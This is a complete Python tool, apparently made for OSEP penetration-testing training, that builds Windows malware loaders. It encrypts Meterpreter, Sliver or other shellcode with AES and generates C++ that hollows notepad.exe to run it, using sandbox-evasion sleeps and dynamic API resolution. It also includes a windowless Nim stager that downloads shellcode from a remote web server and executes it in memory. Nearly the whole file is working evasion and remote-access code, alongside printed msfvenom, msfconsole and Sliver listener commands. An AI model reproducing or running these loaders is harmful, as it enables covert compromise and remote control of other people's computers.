#!/usr/bin/env python3
"""
Process Hollowing Tool v5.2 (Final)
Supports: Meterpreter (staged + stageless), Sliver (hollowing + staged Nim), Generic C2
Technique: AES-CBC encrypted shellcode + Process Hollowing
Staged Sliver: hardened, windowless Nim HTTP stager (--app:gui)
Author: OSEP training tool
"""

import os
import sys
import hashlib
import shutil
import subprocess
from os import urandom
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# ============================================================
# COLORS
# ============================================================
GREEN   = "\033[92m"
BOLD    = "\033[1m"
RED     = "\033[91m"
YELLOW  = "\033[93m"
WHITE   = "\033[97m"
CYAN    = "\033[96m"
MAGENTA = "\033[35m"
RESET   = "\033[0m"

# ============================================================
# AES ENCRYPTION
# ============================================================
def AESencrypt(plaintext, key):
    k          = hashlib.sha256(key).digest()
    iv         = 16 * b'\x00'
    plaintext  = pad(plaintext, AES.block_size)
    cipher     = AES.new(k, AES.MODE_CBC, iv)
    return cipher.encrypt(plaintext), key

# ============================================================
# READ + ENCRYPT SHELLCODE
# ============================================================
def read_and_encrypt(payload_path):
    if not os.path.exists(payload_path):
        print(f"{RED}[!] Payload not found: {payload_path}{RESET}")
        sys.exit(1)
    with open(payload_path, "rb") as f:
        content = f.read()
    print(f"{GREEN}[+] Shellcode loaded : {len(content):,} bytes{RESET}")
    KEY        = urandom(16)
    ciphertext, key = AESencrypt(content, KEY)
    print(f"{GREEN}[+] AES encrypted    : {len(ciphertext):,} bytes{RESET}")
    print(f"{WHITE}[*] AES Key (hex)    : {KEY.hex()}{RESET}")
    ciphertext_str = ', '.join(f'0x{b:02x}' for b in ciphertext)
    key_str        = ', '.join(f'0x{b:02x}' for b in KEY)
    return ciphertext_str, key_str, ciphertext, KEY

# ============================================================
# SHARED C++ TEMPLATE BUILDER
# ============================================================
def build_cpp_template(key_str, ciphertext, KEY, target_process,
                        wait_ms=5000, sleep_ms=1000):
    key_len   = len(KEY)
    sc_len    = len(ciphertext)
    cpp = f"""#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "user32.lib")
#include "shellcode_payload.h"
void aes_decrypt(unsigned char* data, DWORD dataLen,
                 unsigned char* key,  DWORD keyLen) {{
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTKEY  hKey  = 0;
    CryptAcquireContextW(&hProv, NULL, NULL,
                         PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, key, keyLen, 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    CryptDecrypt(hKey, (HCRYPTHASH)NULL, TRUE, 0, data, &dataLen);
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
}}
unsigned char aes_key[] = {{ {key_str} }};
DWORD         aes_key_len = {key_len};
int main() {{
    Sleep({sleep_ms});
    DWORD sc_size = shellcode_len;
    unsigned char* sc = (unsigned char*)HeapAlloc(
        GetProcessHeap(), HEAP_ZERO_MEMORY, sc_size);
    if (!sc) return 1;
    memcpy(sc, shellcode_data, sc_size);
    aes_decrypt(sc, sc_size, aes_key, aes_key_len);
    STARTUPINFOA        si = {{0}};
    PROCESS_INFORMATION pi = {{0}};
    si.cb = sizeof(si);
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    auto pCreateProcess = (BOOL(WINAPI*)(
        LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES,
        LPSECURITY_ATTRIBUTES, BOOL, DWORD,
        LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION
    ))GetProcAddress(hKernel32, "CreateProcessA");
    if (!pCreateProcess(
            "{target_process}", NULL, NULL, NULL,
            FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {{
        HeapFree(GetProcessHeap(), 0, sc);
        return 1;
    }}
    CONTEXT ctx = {{0}};
    ctx.ContextFlags = CONTEXT_FULL;
    auto pGetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT))
        GetProcAddress(hKernel32, "GetThreadContext");
    pGetThreadContext(pi.hThread, &ctx);
    auto pVirtualAllocEx = (LPVOID(WINAPI*)(
        HANDLE, LPVOID, SIZE_T, DWORD, DWORD
    ))GetProcAddress(hKernel32, "VirtualAllocEx");
    LPVOID remote_buf = pVirtualAllocEx(
        pi.hProcess, NULL, sc_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_buf) {{
        TerminateProcess(pi.hProcess, 0);
        HeapFree(GetProcessHeap(), 0, sc);
        return 1;
    }}
    auto pWriteProcessMemory = (BOOL(WINAPI*)(
        HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*
    ))GetProcAddress(hKernel32, "WriteProcessMemory");
    SIZE_T written = 0;
    pWriteProcessMemory(
        pi.hProcess, remote_buf, sc, sc_size, &written);
    ctx.Rcx = (DWORD64)remote_buf;
    auto pSetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT))
        GetProcAddress(hKernel32, "SetThreadContext");
    pSetThreadContext(pi.hThread, &ctx);
    auto pResumeThread = (DWORD(WINAPI*)(HANDLE))
        GetProcAddress(hKernel32, "ResumeThread");
    pResumeThread(pi.hThread);
    WaitForSingleObject(pi.hThread, {wait_ms});
    HeapFree(GetProcessHeap(), 0, sc);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}}
"""
    return cpp

def build_shellcode_header(ciphertext):
    lines  = ["// Auto-generated shellcode header\n"]
    lines.append(f"unsigned int  shellcode_len  = {len(ciphertext)};\n")
    lines.append( "unsigned char shellcode_data[] = {\n")
    for i in range(0, len(ciphertext), 16):
        chunk = ciphertext[i:i+16]
        lines.append("    " + ", ".join(f"0x{b:02x}" for b in chunk) + ",\n")
    lines.append("};\n")
    return "".join(lines)

# ============================================================
# SHARED COMPILER
# ============================================================
def compile_cpp(cpp_source, header_source, output_name, extra_libs=None):
    cpp_file    = "_hollow_build.cpp"
    header_file = "shellcode_payload.h"
    with open(cpp_file,    "w") as f: f.write(cpp_source)
    with open(header_file, "w") as f: f.write(header_source)
    libs = ["-lws2_32", "-lcrypt32", "-luser32"]
    if extra_libs:
        libs += extra_libs
    print(f"{WHITE}[*] Compiling (may take a while for large payloads)...{RESET}")
    try:
        subprocess.run(
            ["x86_64-w64-mingw32-g++", "--static", "-O2",
             "-o", output_name, cpp_file, "-fpermissive"] + libs,
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        size = os.path.getsize(output_name)
        print(f"{GREEN}{BOLD}[+] Compiled: {output_name}{RESET}")
        print(f"{WHITE}[*] Size    : {size:,} bytes ({size//1024} KB){RESET}")
        return True
    except subprocess.CalledProcessError as e:
        print(f"{RED}[!] Compilation failed:{RESET}")
        print(f"{RED}{e.stderr.decode()}{RESET}")
        return False
    finally:
        for f in [cpp_file, header_file]:
            if os.path.exists(f):
                os.remove(f)
                print(f"{WHITE}[*] Cleaned: {f}{RESET}")

# ============================================================
# MODE 1: METERPRETER STAGED
# ============================================================
def hollow_meterpreter_staged(payload_path, output_name="hollow_msf_staged.exe"):
    print(f"\n{CYAN}{BOLD}{'='*60}{RESET}")
    print(f"{CYAN}{BOLD}  Mode: Meterpreter Staged (reverse_tcp){RESET}")
    print(f"{CYAN}{BOLD}{'='*60}{RESET}")
    print(f"{WHITE}[*] Payload  : windows/x64/meterpreter/reverse_tcp")
    print(f"{WHITE}[*] File     : {payload_path}")
    print(f"{WHITE}[*] Output   : {output_name}\n")
    _, key_str, ciphertext, KEY = read_and_encrypt(payload_path)
    cpp    = build_cpp_template(key_str, ciphertext, KEY,
                                 target_process="C:\\\\Windows\\\\System32\\\\notepad.exe",
                                 wait_ms=10000, sleep_ms=500)
    header = build_shellcode_header(ciphertext)
    if compile_cpp(cpp, header, output_name):
        print(f"\n{GREEN}{BOLD}[+] Meterpreter Staged payload ready!{RESET}")
        print(f"{CYAN}[*] Listener:{RESET}")
        print(f"{YELLOW}    msfconsole -q -x \"use exploit/multi/handler; \\")
        print(f"    set PAYLOAD windows/x64/meterpreter/reverse_tcp; \\")
        print(f"    set LHOST <YOUR_IP>; set LPORT 4444; exploit\"{RESET}")
        print(f"{WHITE}[*] Transfer {output_name} to target and run\n")

# ============================================================
# MODE 2: METERPRETER STAGELESS
# ============================================================
def hollow_meterpreter_stageless(payload_path, output_name="hollow_msf_stageless.exe"):
    print(f"\n{CYAN}{BOLD}{'='*60}{RESET}")
    print(f"{CYAN}{BOLD}  Mode: Meterpreter Stageless (meterpreter_reverse_tcp){RESET}")
    print(f"{CYAN}{BOLD}{'='*60}{RESET}")
    print(f"{WHITE}[*] Payload  : windows/x64/meterpreter_reverse_tcp (STAGELESS)")
    print(f"{WHITE}[*] File     : {payload_path}")
    print(f"{WHITE}[*] Output   : {output_name}")
    print(f"\n{YELLOW}[*] Stageless = entire Meterpreter embedded in payload")
    print(f"[*] No stager needed - works through firewalls better{RESET}\n")
    size = os.path.getsize(payload_path)
    print(f"{WHITE}[*] Payload size: {size:,} bytes ({size//1024} KB){RESET}")
    if size < 100000:
        print(f"{YELLOW}[!] Warning: Stageless payloads are usually >200KB")
        print(f"[!] This looks like a staged payload - make sure you used:")
        print(f"    msfvenom -p windows/x64/meterpreter_reverse_tcp ...{RESET}")
    _, key_str, ciphertext, KEY = read_and_encrypt(payload_path)
    cpp    = build_cpp_template(key_str, ciphertext, KEY,
                                 target_process="C:\\\\Windows\\\\System32\\\\notepad.exe",
                                 wait_ms=30000, sleep_ms=1000)
    header = build_shellcode_header(ciphertext)
    if compile_cpp(cpp, header, output_name):
        print(f"\n{GREEN}{BOLD}[+] Meterpreter Stageless payload ready!{RESET}")
        print(f"\n{CYAN}[*] Generate payload with msfvenom:{RESET}")
        print(f"{YELLOW}    msfvenom -p windows/x64/meterpreter_reverse_tcp \\")
        print(f"    LHOST=<YOUR_IP> LPORT=443 -f raw -o stageless.bin{RESET}")
        print(f"\n{CYAN}[*] Listener (exact command you gave):{RESET}")
        print(f"{YELLOW}    msfconsole -q -x \"use exploit/multi/handler; \\")
        print(f"    set PAYLOAD windows/x64/meterpreter_reverse_tcp; \\")
        print(f"    set LHOST 192.168.59.129; set LPORT 443; exploit\"{RESET}")
        print(f"\n{CYAN}[*] Key differences vs staged:{RESET}")
        print(f"{WHITE}    - No internet required after initial connection")
        print(f"    - Works through strict firewalls")
        print(f"    - Larger payload but more reliable")
        print(f"    - Payload: meterpreter_reverse_tcp (no slash){RESET}")
        print(f"{WHITE}[*] Transfer {output_name} to target and run\n")

# ============================================================
# MODE 3: SLIVER (PROCESS HOLLOWING)
# ============================================================
def hollow_sliver(payload_path, output_name="hollow_sliver.exe"):
    print(f"\n{CYAN}{BOLD}{'='*60}{RESET}")
    print(f"{CYAN}{BOLD}  Mode: Sliver C2 (Process Hollowing){RESET}")
    print(f"{CYAN}{BOLD}{'='*60}{RESET}")
    print(f"{WHITE}[*] C2 Framework : BishopFox Sliver")
    print(f"{WHITE}[*] File         : {payload_path}")
    print(f"{WHITE}[*] Output       : {output_name}\n")
    size = os.path.getsize(payload_path)
    print(f"{WHITE}[*] Payload size : {size:,} bytes ({size//1024} KB){RESET}")
    if size > 10*1024*1024:
        print(f"{YELLOW}[!] Large payload ({size//(1024*1024)}MB) - compile will be slow{RESET}")
    _, key_str, ciphertext, KEY = read_and_encrypt(payload_path)
    cpp    = build_cpp_template(key_str, ciphertext, KEY,
                                 target_process="C:\\\\Windows\\\\System32\\\\notepad.exe",
                                 wait_ms=60000, sleep_ms=2000)
    header = build_shellcode_header(ciphertext)
    if compile_cpp(cpp, header, output_name):
        print(f"\n{GREEN}{BOLD}[+] Sliver payload ready!{RESET}")
        print(f"\n{CYAN}[*] Generate Sliver shellcode:{RESET}")
        print(f"{YELLOW}    sliver > generate --mtls <IP>:443 --os windows \\")
        print(f"    --arch amd64 --format shellcode --skip-symbols --save sliver.bin{RESET}")
        print(f"\n{CYAN}[*] Start Sliver listener:{RESET}")
        print(f"{YELLOW}    sliver > mtls --lport 443{RESET}")
        print(f"\n{CYAN}[*] Key fixes applied for Sliver:{RESET}")
        print(f"{WHITE}    - notepad.exe target (not calc.exe - works on Win11)")
        print(f"    - Heap allocation (handles 17MB+ payloads)")
        print(f"    - 60s WaitForSingleObject (mTLS handshake time)")
        print(f"    - 2s initial sleep (bypass sandbox)")
        print(f"    - Header file for shellcode (no compiler array limits){RESET}")
        print(f"{WHITE}[*] Transfer {output_name} to target and run")
        print(f"[*] Session should appear in Sliver in ~10-15 seconds\n")

# ============================================================
# MODE 4: GENERIC
# ============================================================
def hollow_generic(payload_path, output_name="hollow_generic.exe", c2_name="Custom"):
    print(f"\n{CYAN}{BOLD}{'='*60}{RESET}")
    print(f"{CYAN}{BOLD}  Mode: Generic / {c2_name}{RESET}")
    print(f"{CYAN}{BOLD}{'='*60}{RESET}")
    print(f"{WHITE}[*] C2 Framework : {c2_name}")
    print(f"{WHITE}[*] File         : {payload_path}")
    print(f"{WHITE}[*] Output       : {output_name}\n")
    _, key_str, ciphertext, KEY = read_and_encrypt(payload_path)
    cpp    = build_cpp_template(key_str, ciphertext, KEY,
                                 target_process="C:\\\\Windows\\\\System32\\\\notepad.exe",
                                 wait_ms=30000, sleep_ms=1000)
    header = build_shellcode_header(ciphertext)
    if compile_cpp(cpp, header, output_name):
        print(f"\n{GREEN}{BOLD}[+] Generic payload ready!{RESET}")
        print(f"{WHITE}[*] Transfer {output_name} to target and run\n")

# ============================================================
# MODE 5: SLIVER STAGED (NIM HTTP STAGER) – FINAL VERSION
# ============================================================
NIM_TEMPLATE = r"""
import winim/lean
import httpclient, strutils

when defined(debug):
  import os

func toByteSeq*(str: string): seq[byte] {{.inline.}} =
  @(str.toOpenArrayByte(0, str.high))

proc DownloadExecute(url: string): void =
  # Initial sleep to bypass sandboxes
  Sleep(5000)

  var client = newHttpClient()
  var response: string
  try:
    when defined(debug):
      echo "[*] Downloading shellcode from ", url
    let resp = client.get(url)
    if resp.code != Http200:
      when defined(debug):
        echo "[!] HTTP error: ", resp.code
      quit(1)
    response = resp.body
    when defined(debug):
      echo "[+] Downloaded ", response.len, " bytes"
  except:
    when defined(debug):
      let e = getCurrentException()
      echo "[!] Download failed: ", e.msg
    quit(1)

  if response.len == 0:
    quit(1)

  var shellcode: seq[byte] = toByteSeq(response)

  # Use GetCurrentProcess() pseudo-handle (always has PROCESS_ALL_ACCESS)
  let pHandle = GetCurrentProcess()

  let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](shellcode.len),
                             MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READ_WRITE)
  if rPtr == NULL:
    quit(1)

  copyMem(rPtr, addr shellcode[0], shellcode.len)

  let f = cast[proc() {{.nimcall.}}](rPtr)
  f()

when defined(windows):
  when isMainModule:
    DownloadExecute("http://{ip}:{port}/shellc.bin")
"""

def hollow_sliver_staged_nim(web_ip, web_port, output_name="sliver_stager.exe"):
    """
    web_ip   : IP of the HTTP server hosting shellc.bin
    web_port : Port of the HTTP server (e.g., 80)
    """
    print(f"\n{CYAN}{BOLD}{'='*60}{RESET}")
    print(f"{CYAN}{BOLD}  Mode: Sliver Staged (Nim HTTP Stager) [Windowless]{RESET}")
    print(f"{CYAN}{BOLD}{'='*60}{RESET}")
    print(f"{WHITE}[*] Web Server IP   : {web_ip}")
    print(f"[*] Web Server Port : {web_port}")
    print(f"[*] Output          : {output_name}\n")
    print(f"{YELLOW}[!] This is the HTTP server that hosts shellc.bin, NOT the Sliver listener!{RESET}\n")

    # Check Nim and Mingw
    if not shutil.which("nim"):
        print(f"{RED}[!] Nim not found. Install it: sudo apt install nim{RESET}")
        sys.exit(1)
    if not shutil.which("x86_64-w64-mingw32-gcc"):
        print(f"{RED}[!] mingw-w64 not found. Install it: sudo apt install mingw-w64{RESET}")
        sys.exit(1)

    # Generate Nim source
    nim_source = NIM_TEMPLATE.format(ip=web_ip, port=web_port)
    nim_file   = "sliver_stager_temp.nim"
    with open(nim_file, "w") as f:
        f.write(nim_source)
    print(f"{WHITE}[*] Nim source written to {nim_file}{RESET}")

    # Install winim if needed (silent)
    print(f"{WHITE}[*] Ensuring 'winim' library is installed...{RESET}")
    subprocess.run(["nimble", "install", "-y", "winim"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Compile with --app:gui for no console window
    compile_cmd = (
        f"nim c -d:mingw --os:windows --cpu:amd64 --cc:gcc "
        f"--gcc.exe:x86_64-w64-mingw32-gcc "
        f"--gcc.linkerexe:x86_64-w64-mingw32-gcc "
        f"-d:release --opt:size --app:gui {nim_file}"
    )
    print(f"{WHITE}[*] Compiling Nim stager (windowless)...{RESET}")
    try:
        subprocess.run(compile_cmd, shell=True, check=True,
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except subprocess.CalledProcessError as e:
        print(f"{RED}[!] Compilation failed:{RESET}")
        print(f"{RED}{e.stderr.decode()}{RESET}")
        os.remove(nim_file)
        for ext in [".exe", ".o"]:
            if os.path.exists(f"sliver_stager_temp{ext}"):
                os.remove(f"sliver_stager_temp{ext}")
        sys.exit(1)

    # Remove previous output file if it exists (to avoid shutil.move error)
    if os.path.exists(output_name):
        os.remove(output_name)

    # Rename binary to desired output
    if os.path.exists("sliver_stager_temp.exe"):
        shutil.move("sliver_stager_temp.exe", output_name)
        print(f"{GREEN}{BOLD}[+] Stager compiled: {output_name}{RESET}")
    else:
        print(f"{RED}[!] Output binary not found.{RESET}")
        sys.exit(1)

    # Cleanup source files
    for f in [nim_file, "sliver_stager_temp.o"]:
        if os.path.exists(f):
            os.remove(f)

    # Final instructions
    print(f"\n{CYAN}[*] Host the shellcode:{RESET}")
    print(f"{YELLOW}    1. Copy 'shellc.bin' to a folder.")
    print(f"    2. Start web server on port {web_port}:")
    print(f"       python3 -m http.server {web_port}")
    print(f"    3. The stager will download from: http://{web_ip}:{web_port}/shellc.bin\n")
    print(f"{CYAN}[*] Generate Sliver shellcode:{RESET}")
    print(f"{YELLOW}    sliver > generate --mtls <SLIVER_IP>:<SLIVER_PORT> --os windows \\")
    print(f"    --arch amd64 --format shellcode --skip-symbols --save shellc.bin{RESET}")
    print(f"\n{CYAN}[*] Start Sliver listener (separate port!):{RESET}")
    print(f"{YELLOW}    sliver > mtls --lport <SLIVER_PORT>{RESET}")
    print(f"\n{WHITE}[*] Transfer {output_name} to target and execute.")
    print(f"[*] No CMD window appears – session runs silently.")
    print(f"[*] Session should appear in ~10 seconds.\n")

# ============================================================
# DEPENDENCY CHECK
# ============================================================
def check_deps():
    print(f"{WHITE}[*] Checking basic dependencies...{RESET}")
    missing = []
    try:
        import requests, Crypto, colorama
        print(f"{GREEN}[+] Python packages - OK{RESET}")
    except ImportError:
        missing.append("Python modules"); print(f"{RED}[!] Python modules missing{RESET}")
    if shutil.which("x86_64-w64-mingw32-g++"):
        print(f"{GREEN}[+] mingw32-g++      - OK{RESET}")
    else:
        missing.append("mingw-w64"); print(f"{RED}[!] mingw32-g++      - MISSING{RESET}")
    if missing:
        print(f"\n{RED}[!] Missing: {', '.join(missing)}{RESET}")
        print(f"{YELLOW}    pip install requests pycryptodome colorama")
        print(f"    sudo apt install mingw-w64{RESET}\n")
        sys.exit(1)
    print(f"{GREEN}[+] All OK!\n{RESET}")

# ============================================================
# MENU
# ============================================================
def show_menu():
    print(f"{WHITE}Select payload mode:\n{RESET}")
    print(f"  {GREEN}1{RESET}) Meterpreter Staged      (windows/x64/meterpreter/reverse_tcp)")
    print(f"  {GREEN}2{RESET}) Meterpreter Stageless   (windows/x64/meterpreter_reverse_tcp) {YELLOW}[NEW]{RESET}")
    print(f"  {GREEN}3{RESET}) Sliver C2               (Process Hollowing, AES encrypted) {RED}[In-Development]{RESET}")
    print(f"  {GREEN}4{RESET}) Generic                 (Any C2 / raw shellcode)")
    print(f"  {GREEN}5{RESET}) Sliver Staged           (Nim HTTP Stager, windowless) {MAGENTA}[NEW]{RESET}")
    print(f"  {RED}0{RESET}) Exit\n")

def show_payload_help():
    print(f"""
{CYAN}{BOLD}Payload Generation Reference:{RESET}

{WHITE}── Meterpreter Staged ──────────────────────────────────────{RESET}
{YELLOW}msfvenom -p windows/x64/meterpreter/reverse_tcp \\
    LHOST=<IP> LPORT=4444 -f raw -o staged.bin{RESET}

{WHITE}Listener:{RESET}
{YELLOW}msfconsole -q -x "use exploit/multi/handler; \\
    set PAYLOAD windows/x64/meterpreter/reverse_tcp; \\
    set LHOST <IP>; set LPORT 4444; exploit"{RESET}

{WHITE}── Meterpreter Stageless ───────────────────────────────────{RESET}
{YELLOW}msfvenom -p windows/x64/meterpreter_reverse_tcp \\
    LHOST=<IP> LPORT=443 -f raw -o stageless.bin{RESET}

{WHITE}Listener:{RESET}
{YELLOW}msfconsole -q -x "use exploit/multi/handler; \\
    set PAYLOAD windows/x64/meterpreter_reverse_tcp; \\
    set LHOST 192.168.59.129; set LPORT 443; exploit"{RESET}

{WHITE}── Sliver Hollowing ────────────────────────────────────────{RESET}
{YELLOW}sliver > generate --mtls <IP>:443 --os windows \\
    --arch amd64 --format shellcode --skip-symbols --save sliver.bin
sliver > mtls --lport 443{RESET}

{WHITE}── Sliver Staged (Nim) ─────────────────────────────────────{RESET}
{YELLOW}1. Start web server: python3 -m http.server <WEB_PORT>
2. Generate shellcode (Sliver C2 info embedded): sliver > generate --mtls <C2_IP>:<C2_PORT>
3. Run this tool with option 5 – enter the WEB server IP and WEB server port
4. Deliver sliver_stager.exe to target (no CMD window){RESET}
""")

# ============================================================
# MAIN
# ============================================================
def main():
    # ASCII art in green
    print(GREEN + BOLD)
    print(r"""┓┏  ┓┓       ┏┓┓     
┣┫┏┓┃┃┏┓┓┏┏  ┃┓┣┓┏┓┏╋
┛┗┗┛┗┗┗┛┗┻┛  ┗┛┛┗┗┛┛┗""")
    # Title in yellow
    print(YELLOW + BOLD + "        Hollow Ghost v1.0" + RESET)
    # Rest of info in white
    print(WHITE + BOLD + "        Meterpreter Staged | Meterpreter Stageless | Sliver | Generic | Sliver Staged Nim")
    print(WHITE + BOLD + "        Technique: AES-256-CBC + Process Hollowing / Nim HTTP Stager (windowless)")
    print(RESET)

    import argparse
    parser = argparse.ArgumentParser(
        description="Process Hollowing Tool v5.2 (Final)",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("payload",    nargs="?", help="Raw shellcode .bin file")
    parser.add_argument("output",     nargs="?", help="Output .exe filename")
    parser.add_argument("--mode",     default="menu",
        choices=["staged","stageless","sliver","generic","sliver-staged","menu"],
        help=(
            "staged        = Meterpreter staged (meterpreter/reverse_tcp)\n"
            "stageless     = Meterpreter stageless (meterpreter_reverse_tcp)\n"
            "sliver        = BishopFox Sliver C2 (Process Hollowing)\n"
            "generic       = Any raw shellcode\n"
            "sliver-staged = Sliver staged via Nim HTTP stager\n"
            "menu          = Interactive (default)"
        )
    )
    parser.add_argument("--c2-name",  default="Custom", help="C2 name for generic mode")
    parser.add_argument("--help-payloads", action="store_true",
                        help="Show payload generation commands")
    parser.add_argument("--web-ip",   help="IP of the HTTP server hosting shellc.bin")
    parser.add_argument("--web-port", help="Port of the HTTP server hosting shellc.bin")
    args = parser.parse_args()

    if args.help_payloads:
        show_payload_help()
        sys.exit(0)

    if args.mode == "sliver-staged":
        if not args.web_ip or not args.web_port:
            print(f"{RED}[!] --web-ip and --web-port are required for sliver-staged mode.{RESET}")
            sys.exit(1)
        check_deps()
        out = args.output or "sliver_stager.exe"
        hollow_sliver_staged_nim(args.web_ip, args.web_port, out)
        return

    check_deps()

    # ── Interactive menu ──────────────────────────────────
    if args.mode == "menu" and not args.payload:
        show_menu()
        choice = input(f"{WHITE}Enter choice: {RESET}").strip()
        if choice == "0":
            sys.exit(0)
        elif choice == "5":
            web_ip   = input(f"{WHITE}Web server IP (hosting shellc.bin): {RESET}").strip()
            web_port = input(f"{WHITE}Web server port (e.g., 80): {RESET}").strip()
            out      = input(f"{WHITE}Output filename [sliver_stager.exe]: {RESET}").strip()
            if not out:
                out = "sliver_stager.exe"
            hollow_sliver_staged_nim(web_ip, web_port, out)
            return
        else:
            payload = input(f"{WHITE}Enter shellcode file path: {RESET}").strip()
            output  = input(f"{WHITE}Enter output filename [hollow.exe]: {RESET}").strip()
            if not output:
                output = "hollow.exe"
            if   choice == "1":
                hollow_meterpreter_staged(payload, output)
            elif choice == "2":
                hollow_meterpreter_stageless(payload, output)
            elif choice == "3":
                hollow_sliver(payload, output)
            elif choice == "4":
                c2 = input(f"{WHITE}C2 name [Custom]: {RESET}").strip() or "Custom"
                hollow_generic(payload, output, c2)
            else:
                print(f"{RED}[!] Invalid choice{RESET}")
                sys.exit(1)

    elif args.payload:
        default_names = {
            "staged":    "hollow_msf_staged.exe",
            "stageless": "hollow_msf_stageless.exe",
            "sliver":    "hollow_sliver.exe",
            "generic":   "hollow_generic.exe",
            "menu":      "hollow.exe",
        }
        output = args.output or default_names.get(args.mode, "hollow.exe")
        if   args.mode in ("staged", "menu"):
            hollow_meterpreter_staged(args.payload, output)
        elif args.mode == "stageless":
            hollow_meterpreter_stageless(args.payload, output)
        elif args.mode == "sliver":
            hollow_sliver(args.payload, output)
        elif args.mode == "generic":
            hollow_generic(args.payload, output, args.c2_name)

    else:
        print(f"{WHITE}Usage:{RESET}")
        print(f"  bash run.sh                                          # menu")
        print(f"  bash run.sh payload.bin --mode staged                # Meterpreter staged")
        print(f"  bash run.sh payload.bin --mode stageless             # Meterpreter stageless")
        print(f"  bash run.sh payload.bin --mode sliver                # Sliver hollowing")
        print(f"  bash run.sh payload.bin --mode generic               # Any C2")
        print(f"  bash run.sh --mode sliver-staged --web-ip <IP> --web-port <PORT>  # Sliver staged Nim")
        print(f"  bash run.sh --help-payloads                          # Payload generation help")
        sys.exit(0)

if __name__ == "__main__":
    main()
